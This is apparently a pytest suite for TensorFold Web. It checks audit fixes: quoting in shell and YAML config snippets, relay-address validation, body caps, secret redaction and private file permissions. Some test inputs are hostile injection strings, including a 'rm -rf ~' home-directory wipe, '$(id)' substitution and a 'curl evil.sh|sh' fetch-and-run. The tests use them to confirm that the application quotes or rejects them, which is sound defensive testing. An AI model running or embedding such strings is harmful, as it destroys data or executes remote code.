"""A second reader's review of 13 October 2026 (TensorFold 1.0.8 and 1.0.9 beside TensorFold Web), its findings checked
against the code and the real ones fixed: one test per item that can be tested outside a browser."""

import json
import stat

import pytest
from fastapi.testclient import TestClient

from tensorfold_web import brands, diagnostic, living, living_checks, proxy, recipes
from tensorfold_web import settings as settings_mod
from tensorfold_web.catalog import Catalog
from tensorfold_web.engine import Engine
from tensorfold_web.server import create_app


def _client(tmp_path, monkeypatch, **kw):
    monkeypatch.setattr(settings_mod, "config_dir", lambda: tmp_path)
    s = settings_mod.Settings(engine_url="http://127.0.0.1:9", remote=True)
    cat = Catalog()
    cat.refresh_sizes_async = lambda: None
    return TestClient(create_app(settings=s, engine=Engine(s), catalog=cat, **kw)), s


def test_a_value_pasted_into_a_shell_or_a_yaml_file_is_quoted():
    plain = recipes.Ctx(base="http://127.0.0.1:8080", key="tf-abc", model="Qwen3.8-27B")
    assert "export ANTHROPIC_MODEL=Qwen3.8-27B\n" in recipes.SNIPPETS["claude-code"](plain)   # unchanged when plain
    assert "      - id: Qwen3.8-27B\n" in recipes.SNIPPETS["omp"](plain)
    hostile = recipes.Ctx(base="http://h:1", key="k$(id)", model="m; rm -rf ~")
    cc = recipes.SNIPPETS["claude-code"](hostile)
    assert "export ANTHROPIC_MODEL='m; rm -rf ~'" in cc and "export ANTHROPIC_AUTH_TOKEN='k$(id)'" in cc
    assert "-e 'OPENAI_API_KEY=k$(id)'" in recipes.SNIPPETS["open-webui"](hostile)
    assert '- id: "m; rm -rf ~"' in recipes.SNIPPETS["omp"](hostile)
    assert 'default: ["m; rm -rf ~"]' in recipes.SNIPPETS["librechat"](hostile)


@pytest.mark.parametrize("relay", ["http://host;curl+evil.sh|sh", "http://h/$(id)", "http://user@h", "http://h:1/x",
                                   "http://h?x=1"])
def test_the_relay_address_is_a_name_and_a_port_only(tmp_path, monkeypatch, relay):
    c, _ = _client(tmp_path, monkeypatch)
    assert c.get("/api/connect", params={"where": "away", "relay": relay}).status_code == 400


def test_a_relay_address_as_a_browser_gives_it_is_taken(tmp_path, monkeypatch):
    c, _ = _client(tmp_path, monkeypatch)
    for relay in ("https://box.example.ts.net:8443", "http://[::1]:8090", "http://192.0.2.4:8090/"):
        assert c.get("/api/connect", params={"where": "away", "relay": relay}).status_code == 200, relay


def test_the_relay_refuses_a_body_past_its_cap_before_holding_it(tmp_path, monkeypatch):
    monkeypatch.setattr(proxy, "MAX_BODY", 1000)
    c, _ = _client(tmp_path, monkeypatch)
    r = c.post("/engine/v1/chat/completions", content=b"x" * 5000, headers={"content-type": "application/json"})
    assert r.status_code == 413
    assert c.post("/engine/v1/chat/completions", json={"model": "m"}).status_code == 502   # small: sent on


def test_the_diagnostic_hides_a_secret_as_written_inside_json():
    doc = json.dumps({"log": 'engine said key "ab\\"cdef"'})
    assert 'ab\\"cdef' not in diagnostic.redact(doc, ['ab"cdef'])


def test_the_diagnostic_hides_the_key_the_engine_runs_with(tmp_path, monkeypatch):
    c, _ = _client(tmp_path, monkeypatch)
    app_eng = c.app.state.engine
    monkeypatch.setattr(app_eng, "key_in_use", lambda: "tf-the-old-key-still-running")
    app_eng.log.append("started with tf-the-old-key-still-running")
    assert "tf-the-old-key-still-running" not in c.get("/api/diagnostic/report").text


def test_a_maker_is_its_id_and_its_kind(tmp_path):
    b = brands.Brands(tmp_path / "brands.json")
    b.save("nvidia", {"label": "NVIDIA", "kind": "model", "words": ["nemotron"]})
    b.save("nvidia", {"label": "NVIDIA", "kind": "hardware", "words": ["gb10"]})
    assert sorted((x["kind"], x["words"][0]) for x in b.all()) == [("hardware", "gb10"), ("model", "nemotron")]
    b.save("nvidia", {"label": "NVIDIA", "kind": "hardware", "words": ["dgx"]})   # replaces its own kind only
    assert sorted((x["kind"], x["words"][0]) for x in b.all()) == [("hardware", "dgx"), ("model", "nemotron")]
    assert b.remove("nvidia", "hardware")
    assert [x["kind"] for x in b.all()] == ["model"]


def test_removing_a_maker_through_the_route_takes_its_kind(tmp_path, monkeypatch):
    c, _ = _client(tmp_path, monkeypatch)
    for kind in ("model", "hardware"):
        c.put("/api/brands/nvidia", json={"label": "NVIDIA", "kind": kind, "words": ["x"]})
    assert c.delete("/api/brands/nvidia", params={"kind": "model"}).status_code == 200
    assert [x["kind"] for x in c.get("/api/brands").json()["brands"]] == ["hardware"]


def test_a_check_run_holds_the_persons_facts_and_is_written_private(tmp_path, monkeypatch):
    monkeypatch.setenv("TENSORFOLD_WEB_LIVING", str(tmp_path / "living"))
    monkeypatch.setattr(living_checks, "_ask", lambda t, q, thinking: "an answer")
    out = living_checks.run(living.Target("http://127.0.0.1:9", None, "m"), "mine", "before", thinking=False,
                            extra=[{"fact": "My dog is Ginger.", "question": "What is my dog's name?"}])
    path = living_checks._runs_dir("mine") / f"{out['id']}.json"
    assert stat.S_IMODE(path.stat().st_mode) == 0o600


def _copy(tmp_path, monkeypatch, name="mine"):
    """A copy of a tiny snapshot, as `living.create` makes it."""

    monkeypatch.setenv("TENSORFOLD_WEB_LIVING", str(tmp_path / "living"))
    snap = tmp_path / "snap"
    snap.mkdir()
    (snap / "config.json").write_text(json.dumps({"model_type": "nemotron_h"}))
    (snap / "model.safetensors").write_text("weights")
    monkeypatch.setattr(living, "snapshot_of", lambda _repo: snap)
    living.create(name, "TensorFold/NVIDIA-Nemotron-3.5-Lightning-30B-A3B-MLX-4bit")
    return living.folder(name)


def test_a_copys_weights_are_its_owners_alone(tmp_path, monkeypatch):
    folder = _copy(tmp_path, monkeypatch)
    assert stat.S_IMODE(folder.stat().st_mode) == 0o700
    assert stat.S_IMODE(living.root().stat().st_mode) == 0o700


def test_a_lesson_partly_kept_counts_as_kept(tmp_path, monkeypatch):
    from tensorfold_web import living_versions

    _copy(tmp_path, monkeypatch)
    living._write(living.meta_dir("mine") / "lessons.json",
                  [{"job": "j1", "at": 1.0, "fact": "A.", "outcome": "kept"},
                   {"job": "j2", "at": 2.0, "fact": "B.", "outcome": "partly kept"},
                   {"job": "j3", "at": 3.0, "fact": "C.", "outcome": "missed"}])
    assert living_versions.save("mine", "after three lessons")["kept"] == 2


def test_settings_show_the_users_own_values_while_a_comparison_runs(tmp_path, monkeypatch):
    c, s = _client(tmp_path, monkeypatch)
    s.context = 32768
    c.app.state.temporarily(context=4096)
    assert s.context == 4096                                          # the engine runs the comparison's value
    assert c.get("/api/settings").json()["context"] == 32768          # Settings shows the person's
    assert c.put("/api/settings", json={"theme": "dark"}).json()["context"] == 32768
    c.app.state.comparison_ended()
    assert s.context == 32768


def test_a_copys_memory_is_its_base_models(tmp_path, monkeypatch):
    monkeypatch.setenv("TENSORFOLD_WEB_LIVING", str(tmp_path / "living"))
    c, _ = _client(tmp_path, monkeypatch)
    living._write(living.meta_dir("mine") / "meta.json", {"base": "nvidia/not-in-the-catalog"})
    r = c.get("/api/catalog/living:mine/verdicts")
    assert r.status_code == 404 and r.json()["detail"] == "unknown model"     # the base's own answer, not "no route"
    assert c.get("/api/catalog/living:nobody/verdicts").status_code == 404
    assert c.get("/api/catalog/nothing-like-a-copy/verdicts").status_code == 404


def test_forget_finds_a_fact_given_in_the_engines_words(tmp_path, monkeypatch):
    monkeypatch.setenv("TENSORFOLD_WEB_LIVING", str(tmp_path / "living"))
    living._write(living.meta_dir("mine") / "lessons.json",
                  [{"job": "j1", "at": 1.0, "fact": "My dog is Ginger.", "outcome": "kept",
                    "found": [{"id": 3, "text": "The user's dog is named Ginger.", "outcome": "kept"}]},
                   {"job": "j2", "at": 2.0, "fact": "I live in Paris.", "outcome": "kept"}])
    versions = [{"id": "v1", "label": "before lesson j1", "at": 0.5}, {"id": "v2", "label": "before lesson j2", "at": 1.5}]
    plan = living.forget_plan("mine", "The user's dog is named Ginger.", versions)       # as the graph shows it
    assert plan["version"] == "v1" and plan["fact"] == "My dog is Ginger."
    assert plan["again"] == [{"fact": "I live in Paris.", "question": ""}]
    assert living.forget_plan("mine", "The user lives in Paris", versions)["fact"] == "I live in Paris."   # no `found`
    with pytest.raises(ValueError, match="did not teach"):
        living.forget_plan("mine", "My cat is Pixel.", versions)
